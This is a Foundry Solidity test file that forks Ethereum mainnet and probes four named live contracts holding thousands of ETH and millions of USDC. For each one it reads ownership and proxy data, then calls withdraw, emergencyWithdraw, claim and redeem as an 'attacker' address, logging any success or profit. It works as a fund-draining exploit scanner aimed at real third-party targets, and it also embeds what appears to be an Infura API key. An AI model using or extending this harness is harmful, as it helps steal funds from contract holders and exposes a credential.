// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title More High Value Contracts
 * @notice Analyze newly found high-value contracts
 */
contract MoreHighValueTest is Test {

    address WETH;
    address USDC;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        WETH = vm.parseAddress("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2");
        USDC = vm.parseAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48");
        attacker = address(0xBEEF);
    }

    function test_analyzeD7E4b67E() public {
        // 0xD7E4b67E735733aC98a88F13d087D8aac670E644: 3,285 ETH
        address target = vm.parseAddress("0xD7E4b67E735733aC98a88F13d087D8aac670E644");

        console.log("=== TARGET: 3,285 ETH ===");
        console.log("Address:", target);
        console.log("ETH:", target.balance / 1e18);

        // Check owner
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            console.log("Owner:", abi.decode(d, (address)));
        }

        // Check proxy
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 impl = vm.load(target, implSlot);
        if (uint256(impl) != 0) {
            console.log("Implementation:", address(uint160(uint256(impl))));
        }

        // Try exploit functions
        vm.startPrank(attacker);

        (s,) = target.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("emergencyWithdraw()"));
        console.log("emergencyWithdraw():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        console.log("Attacker ETH after:", attacker.balance / 1e18);
    }

    function test_analyze77b20437() public {
        // 0x77b2043768d28E9C9aB44E1aBfC95944bcE57931: 4,172 ETH
        address target = vm.parseAddress("0x77b2043768d28E9C9aB44E1aBfC95944bcE57931");

        console.log("=== TARGET: 4,172 ETH ===");
        console.log("Address:", target);
        console.log("ETH:", target.balance / 1e18);

        // Check owner
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            console.log("Owner:", abi.decode(d, (address)));
        }

        // Check proxy
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 impl = vm.load(target, implSlot);
        if (uint256(impl) != 0) {
            console.log("Implementation:", address(uint160(uint256(impl))));
        }

        // Try exploit functions
        vm.startPrank(attacker);

        (s,) = target.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        console.log("Attacker ETH after:", attacker.balance / 1e18);
    }

    function test_analyzeFe324099() public {
        // 0xfe3240995c771f10D2583e8fa95F92ee40E15150: 7.5M USDC
        address target = vm.parseAddress("0xfe3240995c771f10D2583e8fa95F92ee40E15150");

        console.log("=== TARGET: 7.5M USDC ===");
        console.log("Address:", target);

        // Check USDC balance
        (bool s, bytes memory d) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", target)
        );
        if (s && d.length >= 32) {
            console.log("USDC:", abi.decode(d, (uint256)) / 1e6);
        }

        // Check owner
        (s, d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            console.log("Owner:", abi.decode(d, (address)));
        }

        // Check name
        (s, d) = target.staticcall(abi.encodeWithSignature("name()"));
        if (s && d.length > 0) {
            try this.decodeName(d) returns (string memory name) {
                console.log("Name:", name);
            } catch {}
        }

        // Check proxy
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 impl = vm.load(target, implSlot);
        if (uint256(impl) != 0) {
            console.log("Implementation:", address(uint160(uint256(impl))));
        }

        // Try exploit functions
        uint256 attackerBefore;
        (s, d) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        if (s && d.length >= 32) {
            attackerBefore = abi.decode(d, (uint256));
        }

        vm.startPrank(attacker);

        (s,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1000e6));
        console.log("withdraw(1000e6):", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("redeem(uint256,address,address)", 1000e6, attacker, attacker));
        console.log("redeem:", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        uint256 attackerAfter;
        (s, d) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        if (s && d.length >= 32) {
            attackerAfter = abi.decode(d, (uint256));
        }

        if (attackerAfter > attackerBefore) {
            console.log("!!! PROFIT:", (attackerAfter - attackerBefore) / 1e6, "USDC");
        } else {
            console.log("No USDC gained");
        }
    }

    function test_analyze3B95bC95() public {
        // 0x3B95bC951EE0f553ba487327278cAc44f29715E5: 2.4M USDC
        address target = vm.parseAddress("0x3B95bC951EE0f553ba487327278cAc44f29715E5");

        console.log("=== TARGET: 2.4M USDC ===");
        console.log("Address:", target);

        // Check USDC balance
        (bool s, bytes memory d) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", target)
        );
        if (s && d.length >= 32) {
            console.log("USDC:", abi.decode(d, (uint256)) / 1e6);
        }

        // Check owner
        (s, d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            console.log("Owner:", abi.decode(d, (address)));
        }

        // Try exploit functions
        vm.startPrank(attacker);

        (s,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1000e6));
        console.log("withdraw(1000e6):", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();
    }

    function decodeName(bytes memory data) external pure returns (string memory) {
        return abi.decode(data, (string));
    }
}
